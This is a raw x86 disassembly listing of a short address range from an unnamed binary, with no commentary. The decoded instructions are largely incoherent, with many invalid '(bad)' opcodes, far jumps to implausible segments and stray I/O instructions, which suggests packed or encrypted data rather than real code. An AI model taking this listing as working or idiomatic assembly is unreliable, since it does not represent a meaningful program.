  416153:	sbb    al,0xeb
  416155:	push   esp
  416156:	jnp    0x416110
  416158:	jne    0x416142
  41615a:	xchg   ebp,eax
  41615b:	sbb    dh,BYTE PTR [edx]
  41615d:	outs   dx,BYTE PTR ds:[esi]
  41615e:	sbb    cl,BYTE PTR [eax+edi*1+0x461ccd72]
  416165:	int3   
  416166:	das    
  416167:	call   0x4b78:0xb0f1e8c9
  41616e:	jmp    0xb92e:0x832bd179
  416175:	sbb    eax,0xbca4b443
  41617a:	outs   dx,DWORD PTR ds:[esi]
  41617b:	adc    edx,ebx
  41617d:	push   edx
  41617e:	ds mov ebx,0x4f73cea9
  416184:	outs   dx,DWORD PTR ds:[esi]
  416185:	cmc    
  416186:	mov    ah,dh
  416188:	mov    ds:0xecac7f68,eax
  41618d:	mov    ah,0xd
  41618f:	test   al,0x5f
  416191:	lea    esp,[eax+ebx*4+0x5a]
  416195:	retf   
  416196:	mov    bl,0xa
  416198:	lahf   
  416199:	push   0x54
  41619b:	and    esi,0x52631dda
  4161a1:	adc    esi,DWORD PTR [eax]
  4161a3:	in     al,dx
  4161a4:	cmp    ah,BYTE PTR [eax-0x25]
  4161a7:	ja     0x4161d6
  4161a9:	int3   
  4161aa:	es cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4161ad:	or     al,0xc5
  4161af:	cmp    BYTE PTR [ecx+ebx*4-0x31],bh
  4161b3:	sub    eax,DWORD PTR [eax]
  4161b5:	(bad)  
  4161b6:	repnz out dx,al
  4161b8:	dec    ebx
  4161b9:	cdq    
  4161ba:	pop    eax
  4161bb:	and    esi,DWORD PTR [ecx+0x65]
  4161be:	shl    bl,1
  4161c0:	popf   
  4161c1:	dec    edi
  4161c2:	mov    bh,0x34
  4161c4:	arpl   WORD PTR [edi],dx
  4161c6:	out    0xc9,eax
  4161c8:	in     eax,0xe0
  4161ca:	sbb    eax,0x5df38c0e
  4161cf:	and    ecx,eax
  4161d1:	loopne 0x4161d2
  4161d3:	int3   
  4161d4:	jbe    0x4161dd
  4161d6:	int    0xd
  4161d8:	inc    ebx
  4161d9:	call   0x545b:0x73b00c85
  4161e0:	push   cs
  4161e1:	fstp   TBYTE PTR [edi]
  4161e3:	daa    
  4161e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161e5:	test   al,0x33
  4161e7:	test   al,0x26
  4161e9:	mov    ebx,DWORD PTR [ecx+esi*4+0x79e12c87]
  4161f0:	adc    eax,0x9bf804fc
  4161f5:	or     DWORD PTR [esi+0x3d],esp
  4161f8:	pop    ebp
  4161f9:	pushf  
  4161fa:	pop    edx
  4161fb:	inc    eax
  4161fc:	int3   
  4161fd:	bound  ecx,QWORD PTR [esi+0x13]
  416200:	push   0x78a0bf0c
  416205:	int3   
  416206:	and    al,0xc0
  416208:	pusha  
  416209:	xchg   edi,eax
  41620a:	shl    DWORD PTR [eax+0x6d],1
  41620d:	arpl   bx,bp
  41620f:	sub    BYTE PTR [edi+0x5c878e50],ch
  416215:	retf   0x6e93
  416218:	loop   0x4161a0
  41621a:	je     0x416264
  41621c:	fnstsw WORD PTR ds:0x83c6442
  416222:	push   0x229141df
  416227:	mov    fs,WORD PTR [edx-0x1486cbdc]
  41622d:	or     BYTE PTR [esi+0x3585d0af],al
  416233:	aaa    
  416234:	shl    DWORD PTR [ebp-0x72629fae],1
  41623a:	sar    DWORD PTR [ebx],1
  41623c:	outs   dx,BYTE PTR ds:[esi]
  41623d:	mov    ebp,0x6d3a7cc9
  416242:	nop
  416243:	inc    ebp
  416244:	fwait
  416245:	mov    BYTE PTR [esi],bl
  416247:	and    eax,0xc3265fad
  41624c:	lock sub al,0xf7
  41624f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416250:	iret   
  416251:	mov    dh,0xd9
  416253:	nop
  416254:	test   DWORD PTR [ebx],eax
  416256:	pop    ebp
  416257:	or     al,0x52
  416259:	bound  ebx,QWORD PTR [edx-0x335355c9]
  41625f:	jnp    0x41628f
  416261:	pusha  
  416262:	inc    ebp
  416263:	fdiv   DWORD PTR [ebp+0x26]
  416266:	fnsave [eax]
  416268:	cmc    
  416269:	sub    dl,BYTE PTR [ebp+ebx*8+0x70d436a7]
  416270:	pop    esi
  416271:	out    dx,al
  416272:	mov    cl,0xdd
  416274:	sub    ebx,esi
  416276:	clc    
  416277:	stc    
  416278:	inc    ebp
  416279:	xor    BYTE PTR [ebx-0x50],dl
  41627c:	push   esp
  41627d:	add    esi,ebp
  41627f:	ss xor eax,0x65c097ec
  416285:	sbb    DWORD PTR [ebp-0x7d76fae3],ebx
  41628b:	fwait
  41628c:	add    al,0xd5
  41628e:	mov    dh,BYTE PTR [eax-0x1be418ef]
  416294:	lods   eax,DWORD PTR ds:[esi]
  416295:	sbb    BYTE PTR ds:0x96fabc2b,cl
  41629b:	sub    dl,BYTE PTR [eax-0x1fe5c11]
  4162a1:	iret   
  4162a2:	mov    al,0xbf
  4162a4:	bound  eax,QWORD PTR [esi-0x3f]
  4162a7:	les    edi,FWORD PTR [ecx+0x43]
  4162aa:	int3   
  4162ab:	into   
  4162ac:	pop    esp
  4162ad:	ss jb  0x41623e
  4162b0:	mov    esp,0x797be584
  4162b5:	in     al,0xee
  4162b7:	push   ebp
  4162b8:	mov    ebx,0x2618d0b2
  4162bd:	push   esp
  4162be:	aaa    
  4162bf:	lea    esp,[edi+ebx*2+0x3]
  4162c3:	push   0xffffffa3
  4162c5:	xlat   BYTE PTR ds:[ebx]
  4162c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162c7:	lods   eax,DWORD PTR ds:[esi]
  4162c8:	pop    ebp
  4162c9:	je     0x4162a8
  4162cb:	shl    dh,0x21
  4162ce:	fdiv   st(4),st
  4162d0:	outs   dx,BYTE PTR ds:[esi]
  4162d1:	xor    al,0xcc
  4162d3:	not    BYTE PTR [ecx+0x7817e750]
  4162d9:	dec    edi
  4162da:	iret   
  4162db:	call   0xa016fb66
  4162e0:	inc    eax
  4162e1:	xchg   edi,eax
  4162e2:	jmp    0x41635e
  4162e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162e5:	mov    bl,0xf0
  4162e7:	repz inc ecx
  4162e9:	and    eax,DWORD PTR [esi-0x24d1ffd3]
  4162ef:	sahf   
  4162f0:	out    dx,eax
  4162f1:	mov    ch,0xfa
  4162f3:	js     0x416368
  4162f5:	mov    esi,0x81e794c5
  4162fa:	push   0x9
  4162fc:	xchg   edx,eax
  4162fd:	shr    BYTE PTR [ecx-0x25],0xb8
  416301:	lea    edi,[ebp-0x17e07782]
  416307:	push   eax
  416308:	ja     0x416293
  41630a:	into   
  41630b:	or     eax,0x5272cf69
  416310:	inc    esi
  416311:	loope  0x416385
  416313:	pop    edx
  416314:	imul   edi,edi,0x60ef4885
  41631a:	xor    BYTE PTR [esi+0x57],ch
  41631d:	xor    ecx,DWORD PTR [esi-0x3e]
  416320:	mov    cl,0x84
  416322:	or     eax,0xd4f6e614
  416327:	push   ss
  416328:	cmp    bl,dh
  41632a:	cmp    al,0xbe
  41632c:	xchg   edx,eax
  41632d:	pop    ebp
  41632e:	in     eax,0x64
  416330:	inc    esi
  416331:	jmp    0x96c:0x17362dea
  416338:	mov    bl,0x1c
  41633a:	push   ebp
  41633b:	cmp    eax,0xb9ac85f5
  416340:	inc    edx
  416341:	(bad)  
  416342:	aas    
  416343:	jnp    0x4163bb
  416345:	inc    eax
  416346:	pop    esi
  416347:	mov    al,0x79
  416349:	(bad)  [edi]
  41634b:	retf   0xe3c0
  41634e:	cli    
  41634f:	pop    ebx
  416350:	adc    al,0xa3
  416352:	add    eax,0xd4df248
  416357:	(bad)  
  416358:	fadd   st(1),st
  41635a:	(bad)  
  41635b:	jnp    0x4162fd
  41635d:	inc    esp
  41635e:	test   DWORD PTR [eax+0x248e21be],0x845e8f7b
  416368:	and    al,0x5
  41636a:	sbb    ah,BYTE PTR [edx-0x7a6f3f05]
  416370:	jnp    0x416363
  416372:	push   edx
  416373:	rcr    BYTE PTR [edi+0x4fcb86bc],1
  416379:	daa    
  41637a:	mov    ebp,0x61eab58d
  41637f:	sbb    DWORD PTR ds:[esi+0x7f485079],esp
  416386:	outs   dx,BYTE PTR ds:[esi]
  416387:	cwde   
  416388:	retf   
  416389:	(bad)  
  41638a:	hlt    
  41638b:	dec    esi
  41638c:	cwde   
  41638d:	popf   
  41638e:	add    BYTE PTR [esi+0x53],bh
  416391:	les    edx,FWORD PTR [edx+0x64]
  416394:	inc    ecx
  416395:	ins    BYTE PTR es:[edi],dx
  416396:	xor    DWORD PTR [ecx-0x15466106],ecx
  41639c:	mov    ah,al
  41639e:	and    eax,0x2e1ddb5e
  4163a3:	cdq    
  4163a4:	neg    DWORD PTR [esi+0x186e888c]
  4163aa:	jno    0x41638b
  4163ac:	xchg   ebp,eax
  4163ad:	mov    ds:0x238d9fdf,al
  4163b2:	jp     0x4163d2
  4163b4:	xchg   edx,eax
  4163b5:	push   DWORD PTR ds:0x9e55d70e
  4163bb:	jnp    0x416417
  4163bd:	mov    DWORD PTR [esi],ebp
  4163bf:	sbb    al,dh
  4163c1:	aas    
  4163c2:	in     al,0x9c
  4163c4:	test   BYTE PTR [esi],ch
  4163c6:	adc    BYTE PTR [edi],dl
  4163c8:	push   0x9925a051
  4163cd:	mov    cl,0xc7
  4163cf:	nop
  4163d0:	ret    0x5fcc
  4163d3:	ins    BYTE PTR es:[edi],dx
  4163d4:	sub    al,BYTE PTR [ecx+ebx*8-0x68088923]
  4163db:	inc    esp
  4163dc:	cmp    DWORD PTR [eax-0x62],ecx
  4163df:	push   edx
  4163e0:	test   bh,dl
  4163e2:	and    eax,0xf23ba41f
  4163e7:	jecxz  0x416408
  4163e9:	call   0x12486bd6
  4163ee:	dec    edi
  4163ef:	and    ecx,ecx
  4163f1:	sbb    al,0x90
  4163f3:	dec    edx
  4163f4:	ret    0xea59
  4163f7:	add    eax,0xe4829781
  4163fc:	stos   BYTE PTR es:[edi],al
  4163fd:	ss mov ah,0x5e
  416400:	xchg   esp,eax
  416401:	adc    eax,ecx
  416403:	or     ch,bl
  416405:	jmp    0x2b7f:0xee797e15
  41640c:	cmc    
  41640d:	pusha  
  41640e:	jp     0x416431
  416410:	cmp    eax,esi
  416412:	shr    DWORD PTR [ebx+edi*4+0x463fe8f2],cl
  416419:	lds    ebp,FWORD PTR [ebp+0x49726b7e]
  41641f:	xor    edi,0x20
  416422:	pop    ebx
  416423:	dec    ecx
  416424:	fstp   QWORD PTR [ebx-0x2]
  416427:	pop    ds
  416428:	mov    bl,0xc4
  41642a:	pop    eax
  41642b:	mov    al,0xab
  41642d:	mov    dh,0xdf
  41642f:	and    cl,BYTE PTR [edx+0x3ba01138]
  416435:	leave  
  416436:	cmp    ebx,DWORD PTR [ecx]
  416438:	jg     0x4163f8
  41643a:	(bad)  
  41643b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643c:	jnp    0x41649e
  41643e:	adc    BYTE PTR [eax-0x66dc45],ch
  416444:	xchg   BYTE PTR [edi-0x23],bh
  416447:	push   eax
  416448:	push   edx
  416449:	mov    esi,0x1a5554ba
  41644e:	xor    edx,edx
  416450:	sub    eax,DWORD PTR [esi-0x16]
  416453:	cmp    DWORD PTR [edx-0x4f],ebx
  416456:	(bad)  
  416457:	aas    
  416458:	jb     0x416495
  41645a:	sbb    eax,0x2ee6b3da
  41645f:	cmp    BYTE PTR [edx+0x20],al
  416462:	or     ebp,0xfffffff0
  416465:	or     eax,0xc73892bb
  41646a:	inc    ebx
  41646b:	popf   
  41646c:	mov    bh,0x9f
  41646e:	add    bl,bh
  416470:	frndint 
  416472:	adc    eax,0x43ca9c2a
  416477:	icebp  
  416478:	or     DWORD PTR [edx-0x10],edx
  41647b:	je     0x4164a3
  41647d:	mov    ds:0x8eab1fd7,al
  416482:	cmp    cl,BYTE PTR [ebx-0x76]
  416485:	mov    al,0x7f
  416487:	push   esi
  416488:	std    
  416489:	xchg   edx,eax
  41648a:	and    BYTE PTR [ebx-0x4a9ce305],ah
  416490:	lds    eax,FWORD PTR [esi-0x4fb3f740]
  416496:	faddp  st(7),st
  416498:	(bad)  
  416499:	cwde   
  41649a:	aam    0x3a
  41649c:	dec    edx
  41649d:	fstp   TBYTE PTR [ebx]
  41649f:	jl     0x4164ae
  4164a1:	mov    ?,WORD PTR [eax-0x62acac8c]
  4164a7:	dec    esi
  4164a8:	jns    0x416514
  4164aa:	ficomp WORD PTR [edi+0x79]
  4164ad:	push   ebp
  4164ae:	mov    al,0x56
  4164b0:	xlat   BYTE PTR ds:[ebx]
  4164b1:	pop    edi
  4164b2:	mov    bl,0xcc
  4164b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164b5:	pop    esi
  4164b6:	add    cl,BYTE PTR [edi+0x33]
  4164b9:	push   ss
  4164ba:	mov    edx,0x33ac5f91
  4164bf:	and    eax,0x65801995
  4164c4:	rcr    dh,1
  4164c6:	out    dx,al
  4164c7:	outs   dx,BYTE PTR ds:[esi]
  4164c8:	push   esp
  4164c9:	push   eax
  4164ca:	mov    WORD PTR [edi+0x68f9d1b8],cs
  4164d0:	imul   edi,DWORD PTR [edi],0x584e0014
  4164d6:	xchg   ebp,eax
  4164d7:	retf   0x750b
  4164da:	(bad)  
  4164db:	ins    BYTE PTR es:[edi],dx
  4164dc:	into   
  4164dd:	out    0xf8,al
  4164df:	mov    ah,0x2a
  4164e1:	loop   0x416542
  4164e3:	loope  0x416544
  4164e5:	mov    ebx,DWORD PTR [esp+ecx*2]
  4164e8:	ds dec ebx
  4164ea:	sub    al,BYTE PTR [ecx+0x4c]
  4164ed:	aad    0x7f
  4164ef:	pop    ss
  4164f0:	add    edx,DWORD PTR [ebx-0x282a8f6d]
  4164f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f7:	test   DWORD PTR [ecx+0x193c67a2],ebp
  4164fd:	dec    ebx
  4164fe:	outs   dx,BYTE PTR ds:[esi]
  4164ff:	stc    
  416500:	fisttp DWORD PTR [edi]
  416502:	idiv   ch
  416504:	and    ah,BYTE PTR [ebx+0x2dc186fc]
  41650a:	mov    DWORD PTR cs:[ecx+eax*2-0x438e510e],ecx
  416512:	sbb    esp,DWORD PTR [eax]
  416514:	jg     0x4164a9
  416516:	jge    0x416589
  416518:	mov    ebx,0x19f707d0
  41651d:	sub    dh,ah
  41651f:	push   eax
  416520:	scas   eax,DWORD PTR es:[edi]
  416521:	sar    DWORD PTR [edx],cl
  416523:	shr    BYTE PTR [eax+ebx*2-0x31],0x36
  416528:	std    
  416529:	mov    edi,0xe1feabc9
  41652e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41652f:	jnp    0x41659f
  416531:	push   0xffffff98
  416533:	das    
  416534:	mov    BYTE PTR [ebx],al
  416536:	frstor [edi]
  416538:	fucomip st,st(4)
  41653a:	pop    eax
  41653b:	js     0x416536
  41653d:	and    eax,0x5fb99f54
  416542:	push   esp
  416543:	cmp    BYTE PTR [ebx],al
  416545:	rol    DWORD PTR [edx-0x1eef794e],1
  41654b:	iret   
  41654c:	push   0xffffffbf
  41654e:	data16 fmul DWORD PTR [eax-0x70]
  416552:	jge    0x416519
  416554:	mov    al,ds:0x95b584c3
  416559:	and    eax,0xf1b2380c
  41655e:	dec    ebp
  41655f:	cwde   
  416560:	sbb    eax,0x69c0df95
  416565:	retf   0x3109
  416568:	iret   
  416569:	imul   ebp,ecx,0x37
  41656c:	xor    edx,DWORD PTR [ebx]
  41656e:	xchg   DWORD PTR [edi],esp
  416570:	and    BYTE PTR [ebp+0x297d5237],0xae
  416577:	jmp    0x786a:0x3f575f0a
  41657e:	mul    DWORD PTR [ebp-0x715cad87]
  416584:	inc    edi
  416585:	icebp  
  416586:	dec    ecx
  416587:	jg     0x416601
  416589:	mov    esp,0xefd4eda6
  41658e:	lds    esi,FWORD PTR [ebx-0x51]
  416591:	inc    esp
  416592:	dec    esp
  416593:	pop    ebp
  416594:	xchg   esi,eax
  416595:	scas   al,BYTE PTR es:[edi]
  416596:	fidivr DWORD PTR [edi+ecx*1-0x52de2678]
  41659d:	push   es
  41659e:	push   edi
  41659f:	mov    WORD PTR [esi],fs
  4165a1:	mov    ds:0x34aa9a59,al
  4165a6:	add    eax,0x53d8707f
  4165ab:	push   cs
  4165ac:	aam    0xb
  4165ae:	enter  0xfbf3,0xb0
  4165b2:	aaa    
  4165b3:	shl    esi,0x2b
  4165b6:	cmp    al,0xfb
  4165b8:	aaa    
  4165b9:	xchg   esi,eax
  4165ba:	and    al,0xaf
  4165bc:	xor    eax,0xa3d29c81
  4165c1:	mov    eax,ds:0x2d2176fd
  4165c6:	and    eax,0x6362d18a
  4165cb:	xchg   esi,eax
  4165cc:	shl    DWORD PTR [ebp-0x73],cl
  4165cf:	stos   DWORD PTR es:[edi],eax
  4165d0:	adc    eax,0x4bf368d7
  4165d5:	bound  esi,QWORD PTR [ebx+0x5b]
  4165d8:	jle    0x416585
  4165da:	pop    edi
  4165db:	stos   DWORD PTR es:[edi],eax
  4165dc:	mov    es,WORD PTR fs:[edx]
  4165df:	out    dx,al
  4165e0:	fnstenv [esi]
  4165e2:	jns    0x416596
  4165e4:	ret    
  4165e5:	fisttp WORD PTR [ecx]
  4165e7:	add    DWORD PTR [edx+0x55c7922],ebx
  4165ed:	adc    al,0x49
  4165ef:	mov    edi,DWORD PTR [eax+eax*4-0x35]
  4165f3:	jb     0x416578
  4165f5:	and    cl,bl
  4165f7:	push   0x4f3ed616
  4165fc:	sbb    ah,ah
  4165fe:	adc    DWORD PTR [ecx],0xfffffffd
  416601:	sbb    al,0x18
  416603:	xor    al,0x6f
  416605:	in     al,0x15
  416607:	or     BYTE PTR [edx-0xf],cl
  41660a:	jnp    0x416674
  41660c:	stos   BYTE PTR es:[edi],al
  41660d:	xchg   esi,eax
  41660e:	int3   
  41660f:	or     al,0x5e
  416611:	xchg   ecx,eax
  416612:	mov    ecx,0x96dab666
  416617:	ja     0x416641
  416619:	jmp    0xc6ea:0x34c1fb
  416620:	dec    BYTE PTR [eax]
  416622:	out    0x61,al
  416624:	out    0x8d,eax
  416626:	sbb    DWORD PTR [ecx-0x25],esp
  416629:	dec    edx
  41662a:	dec    edx
  41662b:	cmp    BYTE PTR [ebx+0x65],dh
  41662e:	inc    ebp
  41662f:	dec    esp
  416630:	loopne 0x4166b0
  416632:	test   al,bl
  416634:	xor    DWORD PTR [esi],edx
  416636:	jecxz  0x41668f
  416638:	je     0x41663c
  41663a:	sbb    BYTE PTR [esi],dh
  41663c:	xor    BYTE PTR [esi+0x7a],bl
  41663f:	push   eax
  416640:	mov    ds:0x49f2c719,al
  416645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416646:	adc    eax,0x3365361a
  41664b:	inc    edi
  41664c:	sbb    al,0x2d
  41664e:	xchg   edi,eax
  41664f:	mov    BYTE PTR [ecx+0x11],cl
  416652:	gs push ds
  416654:	cli    
  416655:	adc    al,0xfa
  416657:	les    eax,FWORD PTR [esp+edi*2-0x5e]
  41665b:	mov    bh,dl
  41665d:	sti    
  41665e:	std    
  41665f:	fstp   QWORD PTR [ecx]
  416661:	popa   
  416662:	xchg   esi,eax
  416663:	lock je 0x41667b
  416666:	pop    eax
  416667:	sub    esi,ebx
  416669:	xor    esi,DWORD PTR [eax+eiz*8+0x16]
  41666d:	inc    eax
  41666e:	xchg   edx,eax
  41666f:	adc    DWORD PTR [esi-0x6e],0xb61e8e
  416676:	push   ss
  416677:	jb     0x41664f
  416679:	add    BYTE PTR [ebx-0x6f],dh
  41667c:	mov    al,ds:0x7ccc29f8
  416681:	xor    DWORD PTR [esi-0x38327a22],eax
  416687:	(bad)  [esi+0x3d]
  41668a:	inc    ecx
  41668b:	paddusb mm7,QWORD PTR [ebp-0x132e392b]
  416692:	dec    eax
  416693:	jp     0x41667d
  416695:	(bad)  
  416696:	jge    0x4166d8
  416698:	out    0xb2,eax
  41669a:	(bad)  
  41669b:	fwait
  41669c:	dec    esp
  41669d:	xor    eax,0x88d2337c
  4166a2:	lods   al,BYTE PTR ds:[esi]
  4166a3:	push   ss
  4166a4:	pop    ebp
  4166a5:	mov    al,0x31
  4166a7:	xchg   esp,eax
  4166a8:	bound  esi,QWORD PTR [esi]
  4166aa:	nop
  4166ab:	mov    ds:0xc48f2048,al
  4166b0:	dec    esp
  4166b1:	push   ecx
  4166b2:	pop    ebp
  4166b3:	xchg   edi,eax
  4166b4:	pop    ds
  4166b5:	jb     0x416707
  4166b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166b8:	lea    ebx,[edx-0x572b7269]
  4166be:	mov    eax,0x1dfc0d11
  4166c3:	push   edi
  4166c4:	aam    0xd9
  4166c6:	pop    edi
  4166c7:	pusha  
  4166c8:	in     al,dx
  4166c9:	(bad)  
  4166ca:	lods   eax,DWORD PTR ds:[esi]
  4166cb:	adc    edi,ecx
  4166cd:	mov    ds:0xe2b76475,eax
  4166d2:	retf   0xb42a
  4166d5:	push   ds
  4166d6:	xor    edi,ebx
  4166d8:	ins    DWORD PTR es:[edi],dx
  4166d9:	adc    DWORD PTR [ecx-0x75],eax
  4166dc:	add    edi,DWORD PTR [edx+0x76]
  4166df:	mov    esp,0x61f126bf
  4166e4:	dec    ebx
  4166e5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4166e7:	adc    bh,cl
  4166e9:	pop    edx
  4166ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166eb:	xchg   esp,eax
  4166ec:	pop    esi
  4166ed:	dec    DWORD PTR [esi]
  4166ef:	add    al,0x6
  4166f1:	mov    DWORD PTR [ecx+0x1d],esi
  4166f4:	leave  
  4166f5:	mov    ah,dh
  4166f7:	push   ebp
  4166f8:	push   edi
  4166f9:	push   ss
  4166fa:	retf   0xaf58
  4166fd:	cwde   
  4166fe:	bound  ecx,QWORD PTR [ebp-0x647eb841]
  416704:	jecxz  0x4166c5
  416706:	mov    dl,0xb3
  416708:	inc    esi
  416709:	es inc ebp
  41670b:	adc    bl,BYTE PTR [edi-0x29]
  41670e:	or     ch,BYTE PTR [esi+ebp*1-0x64ff988f]
  416715:	mov    eax,ds:0xb37da649
  41671a:	and    DWORD PTR [ecx+0x3f],eax
  41671d:	fst    QWORD PTR [esi+0x7a7c4157]
  416723:	in     al,0xd0
  416725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416726:	push   cs
  416727:	int3   
  416728:	adc    bl,BYTE PTR [esp+ebx*4+0x3b7a661]
  41672f:	pop    ecx
  416730:	imul   esi,DWORD PTR [edi-0x16b9399],0x4f
  416737:	push   esp
  416738:	add    BYTE PTR [ebx+0x23],ch
  41673b:	ficom  DWORD PTR [ebx+0x2930bbf2]
  416741:	push   ds
  416742:	ror    dl,0xed
  416745:	sub    eax,0xe122713
  41674a:	mov    ds:0xf10b7239,al
  41674f:	mov    bh,0x58
  416751:	call   0xfdd543a3
  416756:	pop    edi
  416757:	sub    esi,DWORD PTR [edi-0x39]
  41675a:	mov    bl,0x30
  41675c:	imul   esp,DWORD PTR ds:0xe8508be4,0x89159e84
  416766:	add    cl,bh
  416768:	push   ss
  416769:	dec    ebp
  41676a:	aas    
  41676b:	adc    al,0x6b
  41676d:	mov    WORD PTR [esi+0x7b],?
  416770:	icebp  
  416771:	sbb    ecx,ecx
  416773:	mov    DWORD PTR [eax],eax
  416775:	sti    
  416776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416777:	ja     0x41676a
  416779:	call   0xb423:0x8567b9a6
  416780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416782:	mov    ch,BYTE PTR [ecx]
  416784:	mov    esp,0x3703dd14
  416789:	mov    eax,0xad5b151b
  41678e:	mov    bh,0x3
  416790:	jne    0x4167a2
  416792:	js     0x41677d
  416794:	add    eax,0x64ac5051
  416799:	dec    esp
  41679a:	pusha  
  41679b:	inc    esi
  41679c:	repz sar DWORD PTR [esi],cl
  41679f:	fadd   DWORD PTR [esi]
  4167a1:	jle    0x4167e8
  4167a3:	xchg   DWORD PTR [edx+0xa9ff758],ebx
  4167a9:	jg     0x416796
  4167ab:	outs   dx,BYTE PTR ds:[esi]
  4167ac:	or     BYTE PTR [esi],bh
  4167ae:	imul   edx,DWORD PTR [ebx],0xffffffa9
  4167b1:	inc    ecx
  4167b2:	(bad)  
  4167b3:	and    ebx,DWORD PTR [edi+0xf]
  4167b6:	in     al,0x5b
  4167b8:	sub    eax,0x5cdb986b
  4167bd:	xchg   edi,eax
  4167bf:	inc    eax
  4167c0:	push   edx
  4167c1:	es jae 0x416826
  4167c4:	je     0x4167aa
  4167c6:	scas   eax,DWORD PTR es:[edi]
  4167c7:	call   0x1478:0x924f9566
  4167ce:	jecxz  0x4167c9
  4167d0:	fidiv  DWORD PTR [esi+ebp*4+0x50]
  4167d4:	xlat   BYTE PTR ds:[ebx]
  4167d5:	mov    cl,0x7e
  4167d7:	int3   
  4167d8:	and    al,0x73
  4167da:	push   esi
  4167db:	enter  0xbbdd,0xfe
  4167df:	ror    BYTE PTR [edi-0x70],1
  4167e2:	mov    eax,ds:0x39216004
  4167e7:	cmc    
  4167e8:	or     BYTE PTR [edi-0x7b],dl
  4167eb:	pop    ecx
  4167ec:	bound  edi,QWORD PTR [ebx+0x10]
  4167ef:	scas   eax,DWORD PTR es:[edi]
  4167f0:	(bad)  
  4167f1:	dec    esp
  4167f2:	leave  
  4167f3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4167f5:	push   0xf1961a87
  4167fa:	jnp    0x4167f7
  4167fc:	gs in  eax,0x7a
  4167ff:	sahf   
  416800:	xchg   BYTE PTR [eax+0x74],bl
  416803:	and    eax,0x69a87096
  416808:	cmp    al,0x40
  41680a:	inc    esp
  41680b:	test   eax,0x1c451de4
  416810:	pop    es
  416811:	cmp    cl,0x96
  416814:	xchg   esp,eax
  416815:	adc    eax,0x799bf450
  41681a:	add    eax,0xdba01a6d
  41681f:	ror    DWORD PTR [edx-0x37d4d639],cl
  416825:	repnz (bad) 
  416827:	cwde   
  416828:	repz dec esp
  41682a:	cmpxchg BYTE PTR ds:0x7f11aaa1,al
  416831:	cdq    
  416832:	xor    ebx,DWORD PTR [eax-0x5aec85a6]
  416838:	mov    cl,0xae
  41683a:	leave  
  41683b:	out    0xc,al
  41683d:	fwait
  41683e:	jno    0x416859
  416840:	add    al,0x16
  416842:	ret    0x3912
  416845:	adc    DWORD PTR [esi-0x54d839f0],eax
  41684b:	jl     0x41685c
  41684d:	or     BYTE PTR [edi-0x8],cl
  416850:	data16 mov al,ds:0xcabd8130
  416856:	adc    dl,BYTE PTR [edx]
  416858:	xchg   ebp,eax
  416859:	xchg   BYTE PTR [ebx+0x49],al
  41685c:	pop    ebp
  41685d:	jne    0x416816
  41685f:	aaa    
  416860:	pop    ecx
  416861:	dec    eax
  416862:	mov    al,ds:0x2252641a
  416867:	popa   
  416868:	pop    esp
  416869:	push   esp
  41686a:	pminub mm3,QWORD PTR ds:0x555b9991
  416871:	push   esi
  416872:	jg     0x4167fd
  416874:	loopne 0x416897
  416876:	cmp    DWORD PTR [edx*4-0x357b53ab],edx
  41687d:	lock mov eax,0xf7053c5c
  416883:	rol    BYTE PTR [eax+0x54a30c68],cl
  416889:	clc    
  41688a:	xor    DWORD PTR [edx+0x7f],ebx
  41688d:	lea    ecx,[edi+0x3f]
  416890:	rcl    DWORD PTR [ecx-0x3d],1
  416893:	andps  xmm5,XMMWORD PTR [edx+0x23]
  416897:	xor    eax,0x3b224a1b
  41689c:	xchg   edi,eax
  41689d:	add    dl,ah
  41689f:	cwde   
  4168a0:	jo     0x4168a2
  4168a2:	and    DWORD PTR fs:[ebp+0x32878a3b],esp
  4168a9:	cmc    
  4168aa:	stc    
  4168ab:	push   ebp
  4168ac:	xor    al,dl
  4168ae:	ror    edi,cl
  4168b0:	sub    DWORD PTR [ecx],esp
  4168b2:	imul   edi,DWORD PTR [ebp-0x567b9ad4],0xffffffe7
  4168b9:	(bad)  
  4168ba:	fcomp  QWORD PTR [ebx]
  4168bc:	fstp   DWORD PTR [ecx]
  4168be:	aam    0x8b
  4168c0:	jp     0x416940
  4168c2:	not    BYTE PTR [esi+ebp*1]
  4168c5:	repnz xchg ebp,eax
  4168c7:	cmp    edi,ebp
  4168c9:	push   ss
  4168ca:	repz out 0x53,eax
  4168cd:	leave  
  4168ce:	retf   
  4168cf:	add    esp,eax
  4168d1:	shl    BYTE PTR [esi],1
  4168d3:	push   eax
  4168d4:	inc    esp
  4168d5:	bound  eax,QWORD PTR [ebx+0x43]
  4168d8:	mov    BYTE PTR ds:0x65cb5642,bh
  4168de:	lods   al,BYTE PTR ds:[esi]
  4168df:	les    esi,FWORD PTR [ecx]
  4168e1:	(bad)  
  4168e2:	arpl   WORD PTR [ecx-0x62],di
  4168e5:	add    eax,DWORD PTR [ebp-0x29]
  4168e8:	xor    edx,ecx
  4168ea:	lahf   
  4168eb:	jge    0x416944
  4168ed:	mov    cl,0xeb
  4168ef:	pop    ebx
  4168f0:	popf   
  4168f1:	fwait
  4168f2:	add    DWORD PTR [edi+0x61],0xa447d687
  4168f9:	iret   
  4168fa:	xchg   esi,eax
  4168fb:	shr    dl,0xc2
  4168fe:	adc    BYTE PTR [ecx],bh
  416900:	(bad)  
  416901:	mov    bl,0xbb
  416903:	aas    
  416904:	retf   
  416905:	xchg   DWORD PTR [ebx+0x60049b07],esi
  41690b:	es cmp al,0x15
  41690e:	push   esi
  41690f:	loopne 0x416928
